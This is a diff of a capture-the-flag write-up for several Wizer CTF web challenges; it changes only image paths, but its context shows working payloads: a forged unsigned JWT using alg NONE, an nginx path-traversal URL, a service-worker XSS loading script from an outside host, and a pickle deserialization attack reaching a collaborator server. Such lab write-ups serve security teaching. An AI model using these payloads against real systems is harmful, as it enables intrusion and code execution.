@@ -89,18 +89,18 @@ app.listen(3000, () => {
 
 This app will check if the `token` parameter is present in the request body's JSON data.
 
-![image](/images/md/4d3fca6b-9060-4393-829b-0c6c4e0be122.webp)
+![image](md/4d3fca6b-9060-4393-829b-0c6c4e0be122.webp)
 
 If `token` is present it will Verify the JWT token.
 
 Reference for JSON web tokens (JWTs): [https://portswigger.net/web-security/jwt](https://portswigger.net/web-security/jwt#what-are-jwts).
 
-![image](/images/md/de844715-31d1-449b-8ea3-6470007a1f16.webp)
+![image](md/de844715-31d1-449b-8ea3-6470007a1f16.webp)
 
 It support all JWT algorithms including `NONE` to verify JWT token, so we can bypass the verification using `NONE` as algorithm. It will accept tokens that have no signature at all.  \
 Then it will check if `{"access":"flag"}` is present in jwt payload data.
 
-![image](/images/md/0000fbad-95fe-49e9-bce5-2f9afc64753a.webp)
+![image](md/0000fbad-95fe-49e9-bce5-2f9afc64753a.webp)
 
 A JWT consists of 3 parts: a header, a payload, and a signature. These are each base64 encoded and separated by a dot. \
 now we create jwt token with HEADER (ALGORITHM & TOKEN TYPE): `{"typ":"JWT","alg":"NONE"}` and PAYLOAD (DATA): `{"access":"flag"}` with blank SIGNATURE.
@@ -110,7 +110,7 @@ Payload:
 {"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJhY2Nlc3MiOiJmbGFnIn0."}
 ```
 
-![image](/images/md/d9bb25fb-df44-4677-8928-23b25caff321.webp)
+![image](md/d9bb25fb-df44-4677-8928-23b25caff321.webp)
 
 <br>
 
@@ -174,7 +174,7 @@ Payload:
 https://nginx.wizer-ctf.com/assets../flag.html
 ```
 
-![image](/images/md/bc9f3e63-0e08-4e37-8124-36fbd23bf7bd.webp)
+![image](md/bc9f3e63-0e08-4e37-8124-36fbd23bf7bd.webp)
 
 <br>
 
@@ -243,14 +243,14 @@ Url: https://events.wizer-ctf.com/
 
 In the webpage there is a `https://events.wizer-ctf.com/app.js`. when we analyse it, we notice that it will Get the "mode" and "color" GET parameters from url and assign it to `modeParam` and `colorParam`.
 
-![image](/images/md/936de271-6404-49a8-bea8-d31955f758c5.webp)
+![image](md/936de271-6404-49a8-bea8-d31955f758c5.webp)
 
 Then it will set `document.getElementById("mode").children[0].id = modeParam;` and `document.getElementById(modeParam).textContent = colorParam;`
 
-![image](/images/md/2d739476-0e09-4815-b9b5-fd90f25d9b92.webp)
+![image](md/2d739476-0e09-4815-b9b5-fd90f25d9b92.webp)
 
 
-![image](/images/md/9545e376-5829-4001-9c7a-5ee1ff4a22fb.webp)
+![image](md/9545e376-5829-4001-9c7a-5ee1ff4a22fb.webp)
 
 
 Here if we put GET parameter `mode=sw` then we can control the value of `const sw` it will be what we give in GET parameter `color`.
@@ -292,7 +292,7 @@ This will get the file from `https://atacker.com/sw.js`.
 
 now to craft our serviceWorker take a look at this.
 
-![image](/images/md/32e8eeae-7d95-4513-bead-2c04a566bb6e.webp)
+![image](md/32e8eeae-7d95-4513-bead-2c04a566bb6e.webp)
 
 
 this will listen for message event on BroadcastChannel('recipebook') and it will alert the `message` property of a message.
@@ -317,7 +317,7 @@ Payload:
 https://events.wizer-ctf.com/?mode=sw&color=\\aftab700.pythonanywhere.com/api/xss
 ```
 
-![image](/images/md/69c5ccec-add7-4347-9f4e-3537df332f21.webp)
+![image](md/69c5ccec-add7-4347-9f4e-3537df332f21.webp)
 
 <br>
 
@@ -373,7 +373,7 @@ if __name__ == '__main__':
     app.run(debug=True)
 ```
 
-![image](/images/md/e1a9a542-c019-45ff-8f29-1901a0346a4c.webp)
+![image](md/e1a9a542-c019-45ff-8f29-1901a0346a4c.webp)
 
 
 Here if GET parameter `load_object` is present it will pass it to `pickle.loads(base64.b64decode(load_object))`. 
@@ -416,7 +416,7 @@ print(r.text)
 
 Request to collaborator:
 
-![image](/images/md/9dc22cfa-ffd1-4156-a89c-11fdb5bfa81c.webp)
+![image](md/9dc22cfa-ffd1-4156-a89c-11fdb5bfa81c.webp)
 
 
 Payload:
@@ -432,7 +432,7 @@ https://dsw3qg.wizer-ctf.com/submit_flag/WIZER{'PICKL1NG_1S_DANGEROUS'}
 
 made it to the top 10.
 
-[![Aftab Sama - Top 10 CTF Challenge](/images/md/88af25f0-6f6d-4f88-9c97-0be8880d8d98.webp)](https://www.linkedin.com/in/aftab-sama/)
+[![Aftab Sama - Top 10 CTF Challenge](md/88af25f0-6f6d-4f88-9c97-0be8880d8d98.webp)](https://www.linkedin.com/in/aftab-sama/)
 
 
 Happy Hacking
